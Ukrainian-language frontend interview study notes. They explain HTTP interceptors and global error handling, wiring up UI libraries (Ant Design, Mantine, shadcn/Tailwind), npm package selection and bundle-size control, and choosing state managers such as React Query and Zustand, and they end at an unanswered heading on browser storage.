## Q1. Що таке interceptors, transient requests і global error handling? 🔵

**🎯 Відповідь на іспиті:** Interceptor — це проміжний обробник, через який проходить кожен HTTP-запит і відповідь: request-interceptor перед відправкою додає `Authorization` і спільні заголовки, response-interceptor централізовано ловить `401` чи `500`. Потрібен він, щоб логіка «з кожним запитом» жила в одній точці, а не в тридцяти копіях по коду; термін пішов з axios, але на нативному `fetch` це просто тонка типізована обгортка. Transient request — разовий fire-and-forget запит (аналітика, heartbeat), результату якого не чекаємо і якому свідомо дозволено впасти тихо. Global error handling — єдина точка (наприклад, глобальний `onError` у React Query), де неочікувана помилка перетворюється на зрозумілу реакцію — тост або редірект на логін. Важлива межа: глобально обробляємо лише помилки, на які компонент не має осмисленої реакції, а очікувані (валідація форми) — локально, інакше користувач отримає і повідомлення у формі, і дублюючий тост зверху.

Уяви типову ситуацію на нашій платформі: у застосунку ~30 місць викликають API — список курсів, профіль студента, чат з AI-агентом. Кожен виклик має додати `Authorization`-токен, кожен має якось відреагувати на `401` (сесія протухла) і на `500`. Якщо це робити в кожному виклику окремо, отримаєш 30 копій одного й того самого коду — і гарантовано забудеш одну: десь токен не додався, десь `401` мовчки проковтнувся, і користувач дивиться на порожній екран. Проблема не в складності коду, а в його **розпорошеності**.

**Interceptor** («перехоплювач») — проміжний обробник, через який проходить *кожен* HTTP-запит і/або *кожна* відповідь. Це одна точка, де живе спільна для всіх запитів логіка. Розрізняють два типи:
- **request interceptor** — виконується *перед* відправкою: додати `Authorization`, спільні заголовки, тенант;
- **response interceptor** — виконується *після* отримання відповіді: централізовано зловити `401`, `500`, розпакувати тіло помилки.

Термін походить з axios (там є буквальний API `axios.interceptors.request.use(...)`), але сама ідея не прив'язана до бібліотеки. На нативному `fetch` обидва типи реалізують тонкою обгорткою — і це варто вміти, бо так видно механізм, а не магію:

```ts
async function apiFetch<T>(path: string, options: RequestInit = {}): Promise<T> {
  // ── request interceptor: усе, що має статися З КОЖНИМ запитом ──
  const headers = new Headers(options.headers);
  headers.set("Content-Type", "application/json");
  const token = getAccessToken();
  if (token) headers.set("Authorization", `Bearer ${token}`); // ← токен додається ОДИН раз тут,
                                                              //   а не в 30 місцях виклику
  const res = await fetch(`/api${path}`, { ...options, headers });

  // ── response interceptor: одна реакція на статуси для всього застосунку ──
  if (res.status === 401) { redirectToLogin(); throw new Error("Unauthorized"); }
  if (!res.ok) throw new Error((await res.json().catch(() => null))?.message ?? "Request failed");

  return res.status === 204 ? (undefined as T) : ((await res.json()) as T);
}
```

Зверни увагу на два рішення в цьому коді. По-перше, при `!res.ok` ми **кидаємо помилку**, а не повертаємо `null` — інакше кожен виклик мусив би перевіряти «а чи не null?», і ми знову розпорошили б обробку. По-друге, обгортка типізована (`<T>`): виклик `apiFetch<Course[]>("/courses")` одразу дає типізований результат.

**Transient request** — разовий, «прохідний» запит, результат якого нікому не потрібен: подія аналітики («студент відкрив урок»), heartbeat, лог помилки на сервер. Найлегше зрозуміти через контраст зі звичайним запитом:

```ts
// ЗВИЧАЙНИЙ запит: чекаємо результат (await), використовуємо його, помилка важлива
const user = await apiFetch<User>("/me"); // await → без результату далі жити не можемо
renderProfile(user);                      // дані йдуть у UI / кеш

// TRANSIENT запит: «надіслати й забути» — результату не чекаємо, не зберігаємо
function trackEvent(name: string, payload: unknown) {
  void apiFetch("/analytics", { method: "POST", body: JSON.stringify({ name, payload }) })
    .catch(() => {}); // ← аналітика некритична: якщо не долетіла — UX не має страждати
}
```

Різниця не в самому запиті, а в тому, **що ми робимо з результатом**: звичайний — чекаємо і використовуємо; transient — відпускаємо (без `await`, без збереження). Оператор `void` перед промісом тут — не магія, а явний маркер для читача й лінтера: «результат свідомо ігноруємо, це не забутий `await`». Ключове правило: «проковтнути помилку» дозволено *лише* для transient-запитів, і це має бути свідоме рішення (той самий `.catch(() => {})` з коментарем), а не забутий обробник.

**Global error handling** — єдина точка, де будь-яка *неочікувана* помилка запиту перетворюється на зрозумілу реакцію (тост, редірект на логін). Працює у **два шари**: транспортний — усередині `apiFetch` вище (`401 → редірект`, `!ok → throw`); і застосунковий — глобальний `onError` у React Query:

```ts
const queryClient = new QueryClient({
  queryCache: new QueryCache({
    onError: (err) => toast.error(err.message), // одна реакція на всі запити, що впали
  }),
});
```

Важлива межа, яку часто пропускають: глобальний обробник — для помилок, на які компонент **не має осмисленої реакції** (сервер впав, мережа зникла). Помилки, які компонент *очікує* і обробляє сам (валідація форми повернула `422`, пошук не знайшов нічого), мають оброблятися локально — інакше користувач отримає і повідомлення у формі, і дублюючий тост зверху. Типова помилка цього рівня — «глобальний тост на все»: виглядає як централізація, а насправді ламає локальні сценарії.

**Підсумок-якір:** interceptor — одна точка для логіки «з кожним запитом» (токен, заголовки, статуси); transient request — fire-and-forget, якому свідомо дозволено впасти тихо; global error handling — останній рубіж для неочікуваних помилок, а очікувані обробляються там, де виникли.

**➕ Пов'язане: чим `Promise.reject` в interceptor кращий за проковтування помилки? 🔵**
В `apiFetch` вище ми на `!res.ok` кидали помилку — розберімо, чому це принципово. Якщо response-interceptor «зловив» помилку і нічого не повернув, код, що викликав запит, вважатиме його успішним і працюватиме з `undefined` — і впаде десь далі, у місці, яке не має жодного стосунку до справжньої причини. Тому в interceptor помилку **перекидають далі** (`throw` / `Promise.reject`), щоб її обробив `try/catch` або `onError` у React Query:

```ts
// ❌ проковтнули: виклик «успішний», але data === undefined → прихований баг,
//    який спливе через три функції звідси як "cannot read property of undefined"
async function bad() { try { return await apiFetch<User>("/me"); } catch { /* тиша */ } }

// ✅ перекинули далі: помилка спливає туди, де її реально обробляють
async function good() { return apiFetch<User>("/me"); } // throw дійде до try/catch чи onError
```

Правило: interceptor може *трансформувати* помилку (додати контекст, нормалізувати формат), але не *гасити* її — виняток лише для свідомо transient-запитів.

**➕ Пов'язане: як через interceptor оновити протухлий access-токен (refresh flow)? 🔵**
В основному прикладі на `401` ми одразу редіректили на логін — але зазвичай сесію можна врятувати. Схема: response-interceptor ловить `401` → викликає `/auth/refresh` (refresh-токен живе в `HttpOnly` cookie, див. Q5) → отримує новий access-токен → **повторює оригінальний запит** з новим токеном. Користувач нічого не помічає. Два підводні камені: (1) якщо одночасно впало п'ять запитів, refresh має виконатись *один* раз — тримають спільний проміс `refreshPromise`, на який чекають усі; (2) якщо і refresh повернув `401` — оце вже справжній логаут, інакше отримаєш нескінченний цикл «401 → refresh → 401 → refresh…».

**➕ Пов'язане: чим глобальний Error Boundary відрізняється від глобального `onError`? 🟢**
Це два різні рубежі для двох різних типів помилок. `onError` у React Query ловить помилки **запитів** (мережа, статуси) — застосунок при цьому живий. **Error Boundary** — React-компонент, що ловить помилки **рендеру** (виняток кинуто прямо під час відмальовування, напр. звернення до поля `undefined`) і замість «білого екрана смерті» показує запасний UI. Потрібні обидва: перший — про «дані не прийшли», другий — про «компонент зламався».

## Q2. Як з нуля підключити UI-бібліотеку (shadcn / Mantine / Ant Design)? 🟣

**🎯 Відповідь на іспиті:** Підключити UI-бібліотеку з нуля — це встановити її, обгорнути застосунок у провайдер теми і задати дизайн-токени централізовано, щоб тема жила в одному місці, а не в компонентах. Беруть бібліотеку насамперед заради готової доступності (фокус-пастка в модалці, клавіатурна навігація, ARIA-атрибути) — це найдорожче писати самому. Флоу залежить від типу бібліотеки: пакетні Ant Design і Mantine — це `npm install` плюс `ConfigProvider`/`MantineProvider` з токенами (у Mantine ще треба вручну імпортувати CSS, інакше компоненти відрендеряться «голими»); shadcn/ui — не пакет, а CLI, що копіює вихідний код компонентів у твій репозиторій, а тема задається CSS-змінними на Tailwind. Обираю за потребою в контролі: стандартний дизайн і швидкість — пакетна бібліотека з безкоштовними оновленнями; кастомний дизайн, який доведеться допилювати, — shadcn, де код твій, але й оновлення ручні. Типові помилки — змішати дві бібліотеки в одному проєкті (дві теми, конфлікти стилів) і хардкодити кольори повз токени: перший же ребрендинг перетворюється на пошук хексів по всьому коду.

Старт нового проєкту: потрібні кнопки, модалки, селекти, форми. Писати їх самому — тижні роботи, і найскладніше навіть не вигляд, а **доступність** (фокус-пастка в модалці — щоб Tab не «втікав» під модалку; керування селектом з клавіатури; ARIA-атрибути — спеціальні HTML-атрибути на кшталт `aria-selected`, які пояснюють скрін-рідерам роль і стан елемента) — усе те, що готові бібліотеки вже вирішили. Тому беруть UI-бібліотеку. «З нуля підключити» = встановити, обгорнути застосунок у **провайдер теми** (компонент-обгортка на верхівці дерева, що через React Context роздає налаштування теми всім компонентам усередині), задати **дизайн-токени** централізовано, переконатися, що стилі підвантажуються.

Дизайн-токени — це іменовані значення дизайну (основний колір, радіус скруглення, шрифт), винесені в одне місце. Компоненти посилаються на токен (`colorPrimary`), а не на конкретний колір (`#0e7c86`) — тоді ребрендинг = зміна кількох токенів, а не пошук хексів по всьому коду.

Три популярні варіанти влаштовані **принципово по-різному**, і саме це визначає флоу підключення:

| | Ant Design | Mantine | shadcn/ui |
|---|---|---|---|
| Що це | пакет готових компонентів | пакет компонентів | **не пакет** — код копіюється до тебе |
| Тема | `ConfigProvider` + токени | `MantineProvider` + об'єкт теми | CSS-змінні |
| Стилі | з коробки (CSS-in-JS у v5) | CSS треба імпортувати вручну | Tailwind-класи у твоєму коді |
| Оновлення | `npm update` | `npm update` | вручну (код уже твій) |

Звідси два різні флоу «з нуля»: **пакетні** (Ant, Mantine) — `npm install` + обгорнути в провайдер; **CLI-копіювання** (shadcn) — не встановлюєш пакет, а генеруєш компоненти у свій репозиторій.

**Ant Design** (пакет, стилі з коробки — найкоротший шлях до працюючого UI):
```tsx
// npm i antd
import { ConfigProvider, theme } from "antd";

<ConfigProvider theme={{
  token: { colorPrimary: "#0e7c86", borderRadius: 8 }, // ← дизайн-токени в одному місці
  algorithm: theme.defaultAlgorithm,                    // або darkAlgorithm для темної теми
}}>
  <App />
</ConfigProvider>
```

**Mantine** (пакет, але CSS імпортується вручну — і це джерело класичного багу):
```tsx
// npm i @mantine/core @mantine/hooks
import { MantineProvider, createTheme } from "@mantine/core";
import "@mantine/core/styles.css"; // ← БЕЗ цього рядка компоненти відрендеряться «голими»:
                                   //   розмітка є, стилів нема — частий перший ступор новачка

const t = createTheme({ primaryColor: "teal", defaultRadius: "md" });
<MantineProvider theme={t}><App /></MantineProvider>
```

**shadcn/ui** — інша філософія: CLI одноразово ініціалізує проєкт і **копіює вихідний код** компонентів у твій репозиторій. Далі це твій код: повний контроль над стилями й поведінкою, але й оновлення — вручну:
```bash
npx shadcn@latest init        # одноразово: підключає Tailwind, шляхи, CSS-змінні теми
npx shadcn@latest add button  # копіює вихідний код <Button> у src/components/ui/
```
Тема — через CSS-змінні, а не провайдер (провайдеру нема що конфігурувати — компоненти вже твої):
```css
:root { --primary: 200 80% 30%; --radius: 0.5rem; } /* HSL-токени: змінив тут — змінилось усюди */
```

**Як налаштовується сам Tailwind** (фундамент shadcn): встановлюють пакет із Vite-плагіном (`npm i tailwindcss @tailwindcss/vite`), реєструють плагін у `vite.config.ts` і одним рядком `@import "tailwindcss"` підключають утиліти в головному CSS. Кастомні токени у Tailwind v4 задають директивою `@theme` прямо в CSS — без окремого `tailwind.config.js`, як було у v3:
```ts
// vite.config.ts — реєстрація плагіна
import tailwindcss from "@tailwindcss/vite";
export default { plugins: [tailwindcss()] };
```
```css
/* головний CSS: підключення Tailwind + власні токени */
@import "tailwindcss";
@theme { --color-primary: #0e7c86; --radius-md: 0.5rem; } /* → утиліти bg-primary, rounded-md */
```

**Як обрати з трьох** — драбина за потребою в контролі: якщо дизайн стандартний і швидкість важливіша за унікальність → **пакетна** бібліотека (Ant/Mantine): компоненти готові, оновлення безкоштовні. Якщо дизайн кастомний і ти очікуєш «допилювати» компоненти під себе → **shadcn**: код твій, жодних бійок зі стилями бібліотеки через `!important`. Критерій переходу — момент, коли кастомізація пакетної бібліотеки стає болючішою, ніж володіння власним кодом.

**Типові помилки:** (1) змішати дві бібліотеки «бо в тій кращий DatePicker» — дві теми, два набори токенів, конфлікти стилів; (2) хардкодити кольори повз токени — проблема стає видимою при першому ж ребрендингу:
```tsx
// ❌ хардкод: таких місць у коді буде 50, зміна бренду = пошук усіх хексів руками
<Button className="bg-[#0e7c86] rounded-[8px]">Записатися</Button>
// ✅ токен: зміна бренду = один рядок у @theme / :root
<Button className="bg-primary rounded-md">Записатися</Button>
```
(3) для Mantine — забутий імпорт CSS (див. коментар у коді вище): компоненти рендеряться, але виглядають «голими».

**Підсумок-якір:** підключення = провайдер/ініціалізація + токени централізовано; головна розвилка — пакет (готове, оновлюване) проти shadcn-копіювання (повний контроль, ручні оновлення); тема завжди живе в токенах, а не в компонентах.

**➕ Пов'язане: чим CSS-in-JS відрізняється від utility-first (Tailwind)? 🔵**
У таблиці вище Ant v5 позначений як CSS-in-JS, а shadcn стоїть на Tailwind — це два протилежні способи доставки стилів. **CSS-in-JS** (styled-components, Emotion, Ant v5) генерує стилі з JavaScript **у рантаймі**: можна обчислювати стилі динамічно за пропсами, але браузер платить за це виконанням JS на кожен рендер. **Utility-first** (Tailwind) — готові атомарні класи (`px-4 text-sm`), які збираються **на білді**: рантайму майже нема, у продакшн потрапляє лише реально використаний CSS. Звідси менший bundle і швидкість — ціною «довгих» `className` у розмітці. shadcn спирається на Tailwind саме тому: стилі статичні, передбачувані й нічого не коштують у рантаймі.

**➕ Пов'язане: що таке headless (unstyled) бібліотека? 🟢**
shadcn під капотом стоїть на Radix — це якраз headless-бібліотека. Вона дає **поведінку й доступність** (фокус-пастка, клавіатурна навігація, ARIA-атрибути) без жодного візуального стилю — вигляд повністю твій. Це відповідь на дилему «або готовий вигляд, або повний контроль»: найскладніше в компоненті (доступність селекта чи модалки) береш готовим, а стилі пишеш свої. shadcn = Radix (поведінка) + Tailwind (вигляд) + код у твоєму репозиторії.

**➕ Пов'язане: що робити, коли компонент бібліотеки не покриває дизайн? 🔵**
Природне наступне питання після підключення: дизайнер намалював те, чого в бібліотеці нема. Драбина ескалації: **токени** (може, досить змінити колір/радіус глобально?) → **пропси компонента** (більшість бібліотек мають `variant`, `styles`, `classNames` для точкових правок) → **композиція** (зібрати потрібне з простіших компонентів бібліотеки) → **свій компонент на headless-основі** (Radix дає поведінку, вигляд твій). Антипатерн — глушити стилі бібліотеки через `!important` і глибокі CSS-селектори по внутрішніх класах: такі правки ламаються на кожному оновленні бібліотеки, бо внутрішня структура — не публічний API.

## Q3. Як обирати npm-пакет для UI-задачі і контролювати вплив на bundle? 🟣

**🎯 Відповідь на іспиті:** Кожен npm-пакет — це кілобайти, які користувач має завантажити, розпарсити й виконати, і на бюджетному телефоні парсинг JS у рази повільніший, ніж на ноутбуці розробника, тому вибір пакета — завжди рішення про розмір bundle і performance. Спершу питаю, чи потрібен пакет узагалі: дати й числа закриває `Intl`, HTTP — нативний `fetch`, прості анімації — CSS. Якщо пакет таки потрібен, до встановлення дивлюся на bundlephobia розмір minified + gzip, чи він tree-shakeable, скільки тягне під-залежностей і чи живий (дата релізу, TS-типи). Реальний вплив міряю bundle analyzer-ом (наприклад, `rollup-plugin-visualizer`): він будує карту білду, і порівняння до/після показує чесну ціну пакета саме в моєму застосунку. Якщо пакет важкий, але потрібен — замінюю на легший еквівалент (класика: moment → date-fns/dayjs) або виношу в lazy-chunk, щоб платили лише ті, хто відкриває цю фічу. Типова помилка — обирати за зірками на GitHub і зручністю API, взагалі не глянувши на розмір.

Реальний сценарій: у застосунок додали бібліотеку графіків для дашборда прогресу студентів — і сторінка стала відкриватись на 3 секунди довше на телефоні. Щоб зрозуміти, чому так, треба спершу розібратися, що таке bundle.

**Bundle** — це результат збірки: bundler (у Vite це Rollup) бере твій код і код усіх npm-залежностей, склеює в один чи кілька JS-файлів — саме їх завантажує браузер. Кожен доданий пакет — це кілобайти, які користувач має **завантажити, розпарсити й виконати**. І тут головна пастка: на мобільному боляче не так завантаження (мережа), як **парсинг і виконання JS** — процесор бюджетного телефона обробляє той самий мегабайт JS у 3–5 разів довше за твій робочий ноутбук. Тому «в мене швидко» нічого не каже про користувача. 300 KB зайвих залежностей — це секунди білого екрана на середньому Android.

Звідси методика вибору пакета — **драбина рішень**:

**Крок 0. Чи потрібен пакет узагалі?** Найдешевша залежність — та, якої нема. Багато класичних приводів «поставити пакет» давно закриті платформою:
- дати й числа: `Intl.DateTimeFormat`, `Intl.NumberFormat`, `Intl.RelativeTimeFormat` — замість moment для форматування;
- HTTP: нативний `fetch` — замість axios для типових потреб (interceptors — тонка обгортка, див. Q1);
- анімації: CSS `transition`/`animation` — замість JS-бібліотеки для простих ефектів;
- утиліти: `structuredClone`, `Array.prototype.at`, optional chaining — замість шматків lodash.

**Крок 1. Якщо пакет таки потрібен — критерії оцінки** (перед `npm install`, не після):
- **розмір** — [bundlephobia.com](https://bundlephobia.com) показує вагу minified + gzip (gzip — стиснення, яким сервер віддає файли; чесна метрика — саме стиснений розмір, бо його реально качає користувач);
- **tree-shakeable** — чи може bundler взяти з пакета лише використані функції, викинувши решту (механізм — у похідному питанні нижче);
- **під-залежності** — пакет на 5 KB, що тягне 200 KB транзитивних залежностей, насправді важить 205;
- **підтримка** — дата останнього релізу, відкриті issues, чи є TS-типи. Покинутий пакет — це майбутня діра безпеки і несумісність з новим React.

**Крок 2. Виміряй вплив, а не вір README.** Bundle analyzer будує карту білду — який пакет скільки важить *у твоєму конкретному застосунку*:
```ts
// vite.config.ts
import { visualizer } from "rollup-plugin-visualizer";
export default { plugins: [visualizer({ open: true, gzipSize: true })] };
```
Після `npm run build` відкривається діаграма: площа прямокутника = вага пакета. Порівнюєш картину до і після додавання залежності — це і є чесна ціна пакета.

**Крок 3. Пакет важкий, але потрібен — що робити:**
- **заміна на легший еквівалент:** класика — `moment` (~70 KB, не tree-shakeable) → `date-fns` або `dayjs` (~2 KB):
```ts
// ❌ moment: уся бібліотека потрапляє в bundle, навіть якщо треба одне форматування
import moment from "moment";

// ✅ date-fns: у bundle піде лише імпортована функція
import { format } from "date-fns";
```
- **lazy-load:** якщо важкий пакет потрібен не всім (графіки — лише на дашборді), винеси його в окремий chunk (окремий JS-файл), який браузер завантажить лише на вимогу — `lazy(() => import(...))`, повна механіка у Q14. Результат вимірний: був стартовий bundle 600 KB для всіх → став 300 KB для всіх + 300 KB лише для тих, хто відкрив дашборд.

**Типова помилка на цьому рівні** — обирати пакет за зірками на GitHub і зручністю API, взагалі не дивлячись на розмір, а потім дивуватись повільному старту. Друга — «поставимо lodash цілком, там же все є»: без іменованих імпортів у bundle їде вся бібліотека заради двох функцій.

**Підсумок-якір:** спершу питай «чи потрібен пакет узагалі» (платформа вміє більше, ніж здається); якщо так — оцінюй розмір/tree-shaking/залежності ДО встановлення; вплив міряй analyzer-ом, а не відчуттями; важкий, але потрібний пакет — заміни на легший або вантаж lazy.

**➕ Пов'язане: чим tree-shaking відрізняється від code-splitting? 🔵**
Обидва терміни щойно з'являлися в драбині — і їх постійно плутають, бо обидва «зменшують bundle». **Tree-shaking** — bundler на етапі білду *викидає невикористаний код*: взяв `format` із date-fns — решта функцій у bundle не потрапить. Працює завдяки статичним ES-імпортам (bundler бачить, що саме імпортовано, не виконуючи код). **Code-splitting** — bundler *розбиває* код на окремі файли (chunks), які вантажаться на вимогу: код дашборда з графіками їде окремим файлом лише тому, хто відкрив дашборд. Коротко: tree-shaking зменшує **загальний обсяг**, code-splitting — **момент оплати** (не все одразу). Працюють разом: спершу викинути мертве, потім розкласти живе по чанках.

**➕ Пов'язане: що таке `"sideEffects": false` у package.json? 🟢**
Це підказка, від якої залежить, наскільки сміливо працює tree-shaking з кроку 1. Прапорцем `"sideEffects": false` пакет повідомляє bundler'у: «мої модулі нічого не роблять при самому імпорті» — тоді невикористані модулі можна безпечно викидати. Якщо прапорця нема, bundler *консервативний*: боїться викинути модуль, бо раптом той щось робить глобально (реєструє полифіл, вставляє CSS) — і tree-shaking працює гірше.

**Чи немає негативних ефектів?** Є — якщо збрехати. Коли модуль насправді *має* побічний ефект (глобальний `import "./styles.css"`, полифіл, патч прототипу), а вказано `false`, bundler викине такий імпорт як «невикористаний» — зникнуть стилі або зламається рантайм, причому **лише в production-білді** (у dev tree-shaking не працює, тож баг невидимий до деплою). Тому для часткових ефектів вказують не `false`, а список винятків:
```json
{ "sideEffects": ["*.css", "*.scss"] }
```

**➕ Пов'язане: як не дати bundle рости непомітно (size budget у CI)? 🔵**
Analyzer з кроку 2 — ручний інструмент: подивився раз і забув, а bundle тим часом росте з кожним PR. Рішення — **бюджет розміру** як автоматична перевірка в CI: інструмент типу `size-limit` тримає в конфігу поріг (напр. «стартовий chunk ≤ 250 KB gzip») і валить білд, якщо PR його перевищив:
```json
// package.json
{ "size-limit": [{ "path": "dist/assets/index-*.js", "limit": "250 kB" }] }
```
Ефект психологічний: розмір стає видимим *у момент* додавання залежності (PR червоний — обговорюємо), а не через пів року, коли «чомусь усе повільне» і винних уже не знайти.

## Q4. Які є state-менеджери (Redux / React Query / Context / Zustand) і як обрати? 🟣

**🎯 Відповідь на іспиті:** State-менеджер обирається за типом стану, і головне розрізнення — серверний проти клієнтського: серверний стан (дані з API) — це кеш чужих даних, який застаріває і потребує рефетчу та інвалідації, а клієнтський (модалка, тема, чернетка) — твоя єдина правда, він не застаріває. Для серверного майже завжди беру React Query: кешування за ключем, статуси `isLoading`/`error`, рефетч та інвалідація вже всередині. Для клієнтського — драбина: стан одного компонента — `useState`/`useReducer`; глобальний рідкозмінний (тема, поточний користувач) — React Context; глобальний частозмінний — Zustand, де селектори підписують компонент лише на його зріз стану. Redux Toolkit беру свідомо для великої команди зі складними потоками, де суворі правила і dev-tools окупаються, — це радше організаційне рішення, ніж технічне. Найчастіша помилка — тримати серверні дані вручну в Redux чи Context: це власноруч переписана гірша версія React Query із застарілими даними на додачу.

Симптом, з якого починається це питання: у проєкті все — список курсів, профіль, стан модалки — звалено в один Redux-стор. Кожна нова фіча = action + reducer + selector; дані з API вручну кладуться в стор і **застарівають** (студент записався на курс з іншої вкладки — а список висить старий, бо ніхто не перезапитав). Команда пише багато коду і все одно має баги свіжості даних. Корінь проблеми: різні **типи стану** обслуговуються одним інструментом.

Ключове розрізнення, з якого все випливає:
- **Серверний стан** — дані, що живуть на бекенді (курси, студенти, повідомлення чату). Твоя копія на фронті — це **кеш** (тимчасова локальна копія чужих даних): вона може застаріти, її треба перезапитувати, інвалідувати, показувати «завантажується». Ти цими даними не володієш.
- **Клієнтський стан** — те, що існує лише у браузері (відкрита модалка, тема, чернетка форми). Він не застаріває — ти єдине джерело правди.

Це різні задачі, тому й інструменти різні:

| Інструмент | Тип стану | Коли брати |
|---|---|---|
| **React Query (TanStack)** | Серверний (дані з API) | Майже завжди для бекенду: кеш, рефетч, інвалідація |
| **`useState`/`useReducer`** | Локальний клієнтський | Стан одного компонента чи піддерева |
| **React Context** | Рідкозмінний глобальний | Тема, поточний користувач |
| **Zustand** | Клієнтський глобальний, частозмінний | Глобальний UI-стан без бойлерплейту |
| **Redux Toolkit** | Складний клієнтський, суворі правила | Велика команда, складні потоки, dev-tools |

**Драбина вибору** (іди по кроках, зупиняйся на першому, що підходить):
1. **Це дані з бекенду?** → **React Query**. Це основна маса стану типового застосунку. Він сам вирішує проблеми, які в Redux довелося б писати руками: кешування за ключем, статуси `isLoading`/`error`, рефетч при поверненні на вкладку, інвалідація після мутацій.
2. **Стан потрібен одному компоненту (чи кільком поруч)?** → `useState`/`useReducer`. Жодного менеджера — найдешевше рішення.
3. **Глобальний, але рідкозмінний** (тема, мова, поточний користувач)? → **Context**. Змінюється раз на сесію — ререндер усіх споживачів не болить.
4. **Глобальний і частозмінний** (модалки, сайдбар, стан плеєра уроку)? → **Zustand**: мінімум коду, а селектори підписують компонент лише на його шматок стану.
5. **Складні потоки, сувора структура, велика команда, потрібен time-travel у dev-tools?** → **Redux Toolkit**. Це вже організаційне рішення, а не технічне: суворі правила окупаються, коли людей багато.

**Дефолт:** React Query + `useState`/Zustand закривають майже все. Redux бери свідомо, коли переріс простіше рішення, а не «на всяк випадок».

Шлях від поганого стану до хорошого — на прикладі списку курсів:
```tsx
// ❌ ДО: серверні дані вручну в клієнтському сторі — багато коду, нуль свіжості
// dispatch(fetchCoursesStart()) → fetch → dispatch(fetchCoursesSuccess(data)) → reducer → selector
// і ЖОДЕН із цих рядків не вирішує: коли перезапитати? що як застаріло? де isLoading?

// ✅ ПІСЛЯ: React Query — оголошуєш, ЩО тобі треба, а не ЯК це кешувати
const { data, isLoading, error } = useQuery({
  queryKey: ["courses"],                       // ← ключ кешу: за ним зберігання й інвалідація
  queryFn: () => api.get<Course[]>("/courses"), // ← як отримати дані
});
// кеш, повторні запити, свіжість, статуси — вже всередині
```

**Клієнтський глобальний стан — Zustand** (стор — це хук; селектор `(s) => s.sidebarOpen` означає, що компонент ререндериться лише коли змінився саме цей шматок):
```ts
import { create } from "zustand";
export const useUi = create<{ sidebarOpen: boolean; toggle: () => void }>((set) => ({
  sidebarOpen: false,
  toggle: () => set((s) => ({ sidebarOpen: !s.sidebarOpen })),
}));
// у компоненті: const open = useUi((s) => s.sidebarOpen); ← підписка лише на цей зріз
```

**Рідкозмінний глобальний — Context:**
```tsx
const UserCtx = createContext<User | null>(null);
const user = useContext(UserCtx); // будь-де в піддереві провайдера
```

**Часта помилка на цьому рівні** — тримати серверні дані (відповіді API) вручну в Redux/Context, як у «❌ ДО» вище: ти власноруч переписуєш гіршу версію React Query і отримуєш застарілі дані на додачу.

**Підсумок-якір:** спершу визнач тип стану (серверний = кеш чужих даних, клієнтський = твоя правда), і тип сам вкаже інструмент: сервер → React Query; локальне → useState; глобальне рідкозмінне → Context; глобальне частозмінне → Zustand; складні корпоративні потоки → Redux Toolkit.

**➕ Пов'язане: навіщо `queryKey` і як працює інвалідація кешу? 🔵**
В основному прикладі ми поставили `queryKey: ["courses"]` — розберімо, що це дає. `queryKey` — унікальний ключ, за яким React Query зберігає й знаходить дані в кеші (як ключ у `Map`; `["courses", expertId]` — окремий запис на кожного експерта). **Інвалідація** — це сигнал «дані за цим ключем більше не свіжі, перезапитай»: типово її викликають з мутації, що змінила дані на сервері:
```ts
const { mutate } = useMutation({
  mutationFn: createCourse,
  onSuccess: () => {
    // оновить список курсів, хоча useQuery(["courses"]) живе зовсім в іншому компоненті:
    // зв'язок — через ключ у глобальному queryClient, а не через дерево компонентів
    queryClient.invalidateQueries({ queryKey: ["courses"] });
  },
});
```
Два нюанси, які часто спрощують життя:
- **Матчинг за префіксом:** `["courses"]` збігається з усіма ключами, що з нього починаються (`["courses", 5]`, `["courses", { filter: "active" }]`) — одним викликом оновлюєш список і всі його варіанти.
- **Негайний refetch — лише для активних запитів.** Інвалідація завжди позначає збіги застарілими (`stale`), але одразу перезавантажує тільки ті, що зараз на екрані. Неактивні перезапитаються при наступному монтуванні — тому «оновиться» не завжди означає «цієї ж секунди».

**➕ Пов'язане: що таке `staleTime` і `gcTime`? 🔵**
Раз кеш може застарівати — природне питання: а коли саме React Query вважає дані застарілими? Це два таймери з різними ролями. **`staleTime`** (за замовчуванням `0`) — скільки часу дані вважаються *свіжими*: поки свіжі, повторне монтування компонента бере їх з кешу без запиту; щойно stale — наступна нагода (монтування, фокус вкладки) викличе рефетч. **`gcTime`** (за замовчуванням 5 хв) — скільки *неактивний* кеш (без жодного підписаного компонента) живе в пам'яті до видалення. Практично: для довідників, що майже не змінюються (список категорій курсів), став `staleTime: 5 * 60_000` — і зникнуть «миготливі» перезапити на кожен перехід між сторінками.

**➕ Пов'язане: що таке optimistic update? 🔵**
Інвалідація з попереднього питання оновлює дані *після* відповіді сервера — а що, як користувач має побачити результат миттєво? **Optimistic update** — оновити UI одразу, *не чекаючи* сервера, в припущенні, що запит вдасться: лайк на уроці зафарбовується миттєво, а не через 300 мс. У React Query: `onMutate` — вручну записати нове значення в кеш (і зберегти попереднє), `onError` — відкотити збережене, якщо сервер відмовив. Ціна — складніший код відкату; тому беруть для дрібних частих дій (лайк, чекбокс), а не для критичних операцій (оплата), де краще чесний спінер.

**➕ Пов'язане: коли Context — погана заміна стор-менеджеру? 🟢**
У драбині вище Context дістався лише «рідкозмінного» — ось чому. Context не має селекторів: будь-яка зміна значення провайдера ререндерить **усіх** споживачів, навіть тих, кому потрібна незмінна частина значення. Для теми (змінюється раз на день) це байдуже; для частозмінного стану (текст у полі пошуку, позиція плеєра) — лавина ререндерів.

**Чому лавина ререндерів відчутна?** Ререндер — це повторний виклик функції компонента, щоб перерахувати, *що показати*; один такий виклик дешевий. Але JS виконується в одному потоці (main thread), і в ньому ж браузер малює кадри — щоб рух на екрані був плавним, треба ~60 кадрів за секунду (FPS), тобто ~16 мс на кадр. Поки React перераховує сотні компонентів на кожне натискання клавіші, браузер не встигає малювати — падає FPS, звідси лаги вводу і «желейний» скрол. Страшний не окремий ререндер, а їх кількість × частота — саме тому частозмінне тримають у сторі з селекторами (Zustand/Redux), де підписка точкова.

## Q5. Чим відрізняються localStorage, sessionStorage і cookies (обмеження, безпека)? 🔵

